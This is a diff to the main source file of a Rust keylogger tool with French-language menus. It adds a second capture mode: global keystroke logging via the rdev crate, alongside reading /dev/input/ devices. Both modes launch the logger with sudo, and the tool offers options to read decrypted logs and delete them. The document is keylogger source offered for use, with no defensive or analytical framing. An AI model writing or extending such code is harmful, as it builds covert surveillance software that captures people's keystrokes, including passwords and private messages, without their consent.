@@ -52,7 +52,8 @@ fn main() {
     match cli.command {
         Commands::Start { device } => {
     let options = vec![
-        "Lancer le keylogger",
+        "Lancer keylogger (mode device /dev/input/)",
+        "Lancer keylogger (mode global rdev)",
         "Lire les logs déchiffrés",
         "Supprimer les logs",
         "Quitter",
@@ -62,33 +63,38 @@ fn main() {
 
     match ans {
         Ok(choice) => match choice {
-            "Lancer le keylogger" => {
-                // 🔍 Détection automatique
-                let resolved_device = if device == "auto" {
-                    let detected = modules::logger::detect_keyboard_device()
-                        .expect("❌ Aucun clavier détecté.");
-                    println!("🎹 Clavier détecté → {}", detected);
-                    detected
-                } else {
-                    device.clone()
-                };
-
-                // 🚀 Lancement du keylogger
+            "Lancer keylogger (mode device /dev/input/)" => {
                 let current_path = std::env::current_dir().unwrap();
-		let binary_path = current_path.join("target/release/keylogger-rust");
+                let binary_path = current_path.join("target/release/keylogger-rust");
 
-		Command::new("xterm")
-		    .arg("-hold")
-		    .arg("-e")
-		    .arg("bash")
-		    .arg("-c")
-		    .arg(format!(
-			"sudo {} run --device={}",
-			binary_path.to_string_lossy(),
-			resolved_device
-		    ))
-		    .spawn()
-		    .expect("❌ Échec de lancement du keylogger");
+                Command::new("xterm")
+                    .arg("-hold")
+                    .arg("-e")
+                    .arg("bash")
+                    .arg("-c")
+                    .arg(format!(
+                        "sudo {} run --device=auto",
+                        binary_path.to_string_lossy()
+                    ))
+                    .spawn()
+                    .expect("❌ Erreur lancement keylogger device");
+            }
+
+            "Lancer keylogger (mode global rdev)" => {
+                let current_path = std::env::current_dir().unwrap();
+                let binary_path = current_path.join("target/release/keylogger-rust");
+
+                Command::new("xterm")
+                    .arg("-hold")
+                    .arg("-e")
+                    .arg("bash")
+                    .arg("-c")
+                    .arg(format!(
+                        "sudo {} run --device=rdev",
+                        binary_path.to_string_lossy()
+                    ))
+                    .spawn()
+                    .expect("❌ Erreur lancement keylogger rdev");
             }
 
             "Lire les logs déchiffrés" => {
@@ -96,7 +102,7 @@ fn main() {
                     .arg("-e")
                     .arg("bash -c './target/release/keylogger-rust read; echo \"Appuie sur une touche pour fermer...\"; read'")
                     .spawn()
-                    .expect("❌ Échec de lecture des logs");
+                    .expect("❌ Erreur lecture logs");
             }
 
             "Supprimer les logs" => {
@@ -106,7 +112,7 @@ fn main() {
                     let _ = std::fs::remove_file(&path);
                     println!("{}", "🧹 Logs supprimés !".green());
                 } else {
-                    println!("{}", "❌ Aucun fichier de logs à supprimer.".red());
+                    println!("{}", "❌ Aucun fichier de logs.".red());
                 }
             }
 
@@ -119,7 +125,6 @@ fn main() {
         Err(_) => println!("❌ Erreur dans le menu"),
     }
 }
-
 
 	Commands::Run { device } => {
 	    // 🔍 1. Détection automatique du device si demandé
@@ -144,7 +149,11 @@ fn main() {
 	    let _key = get_or_create_key(passphrase);
 
 	    // 🟢 5. Lancement du keylogger
-	    modules::logger::start_keylogger(&actual_device, passphrase);
+	    if actual_device == "rdev" {
+	    modules::logger::start_rdev_logger(); // 🔥 mode global
+	} else {
+	    modules::logger::start_keylogger(&actual_device, passphrase); // 🎯 mode device
+		}
 	}
 
         Commands::Read { file } => {
